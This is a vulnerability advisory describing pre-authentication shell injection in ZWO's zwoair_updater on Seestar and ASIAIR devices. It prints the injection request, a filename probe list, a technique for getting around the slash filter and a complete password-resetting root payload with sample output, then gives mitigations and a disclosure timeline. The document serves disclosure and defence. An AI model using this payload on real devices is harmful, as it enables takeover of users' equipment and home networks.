# Unauthenticated Remote Code Execution in `zwoair_updater`

**Affected:** every ZWO product that ships the `zwoair_updater` binary, including:
- the **Seestar** smart-telescope family (S30, S30P, S50);
- the **ASIAIR** family (Mini, Plus, Pro);
- **ASI cameras with built-in ASIAIR**, including the ASI2600MC Air (which we tested as the "2600AIR" board, firmware 42.97) and any future "ASI \<model\> Air" integrated unit.

**Component:** `zwoair_updater` (the OTA update receiver). The same binary is shipped across all three product lines; it dispatches per-model behaviour off a single model-string switch, but the vulnerable RPC path is shared.

**Severity:** Critical. Pre-authentication, root-equivalent. Reachable from any host that can speak to the device's command port on the LAN.

---

## TL;DR

The `begin_recv` JSON-RPC method on TCP/4350 accepts a `file_name` parameter that is later spliced into a `/bin/sh` command without proper escaping. The only sanitisation is a literal-`/` filter. Command-substitution syntax (`$(...)`) and every other shell metacharacter pass through and are evaluated by the shell when the updater computes the package's md5 **before** the md5 or RSA-SHA1 signature checks have a chance to run.

The injected code executes as user `pi`, which has passwordless `sudo` on stock firmware. Full device compromise from a single unauthenticated TCP message.

`run_jailbreak.py` (in the parent directory of this folder) targeted the same protocol on Seestar S50 in 2024. ZWO's only change on the ASIAIR was to **renumber the binary file channel from 4361 to 4360**. The injection vulnerability itself is unchanged.

---

## Affected products and firmware

### Directly tested

| Product | Firmware (observed) | Cmd port | File port | Status |
|---|---|---|---|---|
| ZWO ASI2600MC Air (`2600AIR` / model 8) | 42.97 (`version_int=4297`) | 4350 | **4360** | Vulnerable |
| ZWO Seestar S50 | seestar-3.2 (`version_int=2775`) | 4350 | **4361** | Vulnerable |

### Almost certainly affected (same binary, untested)

The same `zwoair_updater` binary is shipped across the Seestar and ASIAIR product lines, with per-model behaviour selected from a single string-match table. Strings extracted from the Seestar S50 firmware enumerate the model identifiers that table covers:

```
ZWO SeeStar Board
ZWO SeeStar S30 Board
ZWO SeeStar S30P Board
ZWO SeeStar S50P Board       (not yet released as of disclosure date)
ZWO SeeStar S50v2 Board      (no public SKU; internal/codename)
ZWO ASI2600MC Air Board
```

The "Board" entry without a suffix appears to identify the shipping Seestar S50. The `S50P` and `S50v2` strings refer to product variants that aren't on sale as of disclosure date (ZWO security engineering can confirm whether those are upcoming SKUs or development codenames); calling them out here in case the same binary is also flighting on internal or pre-release units.

Combined with field reports that ZWO ASIAIR Mini / Plus / Pro share the same daemon binaries (same RPC method names, same JSON-RPC banners), the vulnerability almost certainly affects:

- **Seestar** smart-telescope family: S30, S30P, S50 — file port 4361.
- **ASIAIR** family: Mini, Plus, Pro — file port 4360 (matching the ASI2600MC Air's port allocation).
- **Cameras with built-in ASIAIR**: any ASI camera that integrates the ASIAIR firmware. The ASI2600MC Air is the first such unit; subsequent integrated cameras in the line (e.g. announced future "ASI \<model\> Air" SKUs) inherit the same updater code path and thus the same bug unless ZWO has rebuilt the binary in the meantime.

ZWO security engineering should treat this report as covering all of the above. The PoC's `--device auto` mode probes 4360 then 4361, so a single test command works on any device variant. The operator does not need to know in advance which family they're testing.

---

## Technical detail

### The vulnerable call chain

`zwoair_updater` listens on:

- TCP **4350** — JSON-RPC command channel
- TCP **4360** (ASIAIR) or **4361** (Seestar) — raw binary file channel

The client opens the binary channel first, then the command channel, then sends:

```json
{"id":1,"method":"begin_recv","params":[{
  "file_len": 4,
  "file_name": "<ATTACKER CONTROLLED>",
  "run_update": false,
  "md5": "00000000000000000000000000000000"
}]}
```

The server then accepts `file_len` bytes on the binary channel and runs the following sequence (string-literals lifted from `zwoair_updater`):

```
md5sum "<update_tmp_path>/<file_name>" | cut -d' ' -f1 | tr -d '\n'        ← runs via system()/popen()
openssl dgst -sha1 -verify <pubkey> -signature <sig> <update_tmp_path>/<file_name>
<update_tmp_path>/run_update_pack.sh "<update_tmp_path>/<file_name>"
```

The first line is the bug. `<file_name>` is interpolated into a shell-pipeline string that is then passed to `/bin/sh -c`. The shell processes the string before `md5sum` ever runs, so any `$(...)` inside `<file_name>` is executed. The substituted command runs as the owner of the updater process (`pi`).

### What's filtered, and what isn't

The server's filename validation rejects exactly one character: forward slash (`/`). Every other shell metacharacter `$`, `(`, `)`, `;`, `|`, `` ` ``, `"`, `'`, `\`, `&`, `..`, embedded spaces are accepted.

Verified on Seestar S50 by sending each character in a probe:

```
ok_plain.bin                  → code:0
with space.bin                → code:0
with$dollar.bin               → code:0
with(paren.bin                → code:0
with;semi.bin                 → code:0
with|pipe.bin                 → code:0
with`bt.bin                   → code:0
with"dq.bin                   → code:0
with'sq.bin                   → code:0
with\bs.bin                   → code:0
with\nnewl.bin                → code:0
../traversal.bin              → code:0
sub/inside.bin                → "fail to create file"      ← only '/' is rejected
withampers&end.bin            → code:0
x$IFS.bin                     → code:0
```

### Bypassing the `/` filter

The vulnerable shell command needs paths containing `/`. Because the filter rejects literal `/`, the attacker must construct `/` at shell-evaluation time. Either of these works inside `$(...)`:

- `R=$(echo $PATH|cut -c1)` — `$PATH` always begins with `/`. (Used in our PoC.)
- `R=$(printf '\57')` — POSIX `printf` octal escape.

The constructed variable is then concatenated using brace syntax: `${R}etc${R}shadow`. (Bare `$R"text"` style concatenation broke the shell parser when nested inside the server's outer `"..."` context; brace-delimited variables avoid the issue.)

### Authentication / signatures

`zwoair_updater` embeds two 1024-bit RSA public keys (extracted from the binary at startup to `/tmp/zwo/publickey.pem` and `/tmp/zwo/app_publickey.pem`) and verifies update packages via `openssl dgst -sha1 -verify`. **None of this matters**, because the injection fires before signature verification. The shell substitution at the md5 step is a pre-authentication primitive.

### Filename length

The server accepts file_name values up to ~247 characters before returning a `"fail to create file"` error. The full PoC payload (mount,rw + chpasswd + mount,ro) is ~193 characters and fits comfortably.

---

## Proof of concept

Three scripts in `poc/`:

| Script | Purpose | Modifies device? |
|---|---|---|
| `probe_only.py` | Non-destructive vulnerability check (sends `x$(true)y`) | No |
| `poc_rce.py` | Runs an arbitrary shell payload, writes a marker to verify | Yes (creates a file in /home/pi) |
| `poc_root_shell.py` | End-to-end: sets `pi` password, verifies SSH login | Yes (changes pi password) |

All three auto-detect the binary file channel (4360 vs 4361) so they work on both product lines.

All three scripts auto-detect which product they're talking to (by probing TCP 4360 first, then 4361). Pass `--device seestar` or `--device asiair` to skip the auto-detect. `poc_root_shell.py` also accepts `--password <value>` (default: `raspberry`).

### Minimal reproduction (probe only)

```
$ python3 poc/probe_only.py 192.168.1.121
[*] auto-detect: file port 4360 open → device looks like asiair
[*] binary file channel: 4360
[*] banner: {"Event":"Version",...,"name":"ASI AIR updater","svr_ver_int":6}
[*] response to shell-metachar file_name: {"jsonrpc":"2.0",...,"result":0,"code":0,"id":1}
[!] VULNERABLE: server accepted file_name containing $() ...
```

### Demonstrating root code execution (works for both products)

```
# ASIAIR:
$ python3 poc/poc_root_shell.py 192.168.1.121 --device asiair --password raspberry
# Seestar S50:
$ python3 poc/poc_root_shell.py 192.168.1.39  --device seestar --password raspberry
# Or just auto-detect:
$ python3 poc/poc_root_shell.py 192.168.1.121

[*] target: 192.168.1.121  (cmd 4350, file 4360)
[*] payload: x$(cd;R=$(echo $PATH|cut -c1);sudo mount -o remount,rw $R;echo pi:raspberry|sudo chpasswd;sync;sudo mount -o remount,ro $R)y
[*] firing injection...
[*] verifying via SSH...
uid=1000(pi) gid=1000(pi) groups=1000(pi),...,27(sudo),...
Linux 2600air 4.19.111 ... armv7l GNU/Linux
2600air
PRETTY_NAME="Raspbian GNU/Linux 10 (buster)"
[+] root access established. SSH: ssh pi@192.168.1.121 (password: raspberry)
```

---

## Impact

Any host on the same network as a powered-on ASIAIR, or Seestar, including any device on the customer's home LAN, any device on the ASIAIR's own Wi-Fi access point, or any device on a star party / club observatory network where ASIAIRs are commonly connected, can take complete control of the device with a single TCP message. No interaction with the iOS/Android app is required.

Concrete consequences:

- Persistent malware (rootfs is mounted read-only but the attacker can `mount -o remount,rw /` via the same `sudo` chain).
- Theft of captured astrophotography data via the existing SMB share.
- Modification of captured data on disk.
- Use of the device as a beachhead into the customer's home network (ASIAIRs are typically bridged via Wi-Fi to home networks; they have full network access from there).
- Modification of the `zwoair_updater` binary to silently strip the vulnerability while preserving the attacker's access (so a customer running the disclosed PoC against their own device cannot detect the prior compromise).

---

## Suggested mitigations

In rough order of correctness:

1. **Reject `file_name` values containing any shell metacharacter** (`$`, `` ` ``, `;`, `|`, `&`, `<`, `>`, `(`, `)`, `{`, `}`, `[`, `]`, `'`, `"`, `\`, newline, tab, and space) at the JSON-RPC layer. Allow `[A-Za-z0-9._-]` only.
2. **Stop using `system()` / `popen()` for verification.** Compute md5 in-process via `EVP_DigestInit_ex` / `EVP_DigestFinal_ex`. Verify the signature with `EVP_PKEY_verify`. No shell calls.
3. **If a shell call is unavoidable**, build the argv array directly via `execve()` / `posix_spawn()` with the filename as a literal argument. The shell never sees the value.
4. **Move the signature check first.** Today md5 happens before signature; even after fixing the injection, an attacker who finds an md5 collision could still reach the signature step. Reorder so signature verification is the first thing that runs on any received bytes.
5. **Authenticate `begin_recv` itself.** The license file at `/home/pi/.ZWO/zwoair_license` already contains a per-device signed token. Bind the OTA channel to a session keyed off the device's serial + a nonce so a network attacker cannot trigger update flows at will.
6. **Move both ports away from `0.0.0.0`.** The updater listens on every interface; in practice it only needs the AP interface (`uap0`) and possibly the local Wi-Fi interface. Binding to `127.0.0.1` plus the AP interface narrows the attack surface.
7. **Upgrade the signature digest.** Today's path is SHA-1; modern code should be SHA-256.
8. **Stop running daemons as `pi` with passwordless sudo.** Give the updater its own service account with a tightly-scoped `sudoers` entry for `mount` and the package-installer steps; remove the rest of `sudo` from `pi`.

---

## Disclosure timeline

| Date | Event |
|---|---|
| 2026-05-24 | Vulnerability discovered and confirmed on ZWO ASI2600MC Air fw 42.97 and ZWO Seestar S50 (fw seestar-3.2 / 2775). |
| 2026-05-25 | Report drafted (this document). |
| 2026-05-25 | Report sent to ZWO. |
| 2026-05-25 | ZWO acknowledgement. |
| _TBD_ | Patched firmware released. |
| 2026-06-14 | Public disclosure. Feedback was received on June 4th, confirming work was underway on a fix; no further feedback since, and ZWO closed case 47033.

---

## Context

The original Seestar S50 jailbreak (`run_jailbreak.py` was published in 2024 by @joshumax and used the same OTA upload path to deliver an unsigned `update_package.sh` that set the `pi` user's password to `raspberry`. ZWO patched this by:

- Adding RSA-SHA1 signature verification to `zwoair_updater`.
- On the ASIAIR product line, renumbering the binary file port from 4361 to 4360 (the original PoC is hardcoded to 4361, so it fails to connect on current ASIAIR firmware).

Neither change addressed the underlying shell-injection bug. The signature check is unreachable from the attacker's perspective — the injected command runs before verification happens. The port renumber is a string-search trip-up; the binary channel is trivially discovered by trying both port numbers.

This finding was made during a privacy audit of the reporter's own device. Disclosing in good faith to give ZWO time to patch before sharing more broadly.
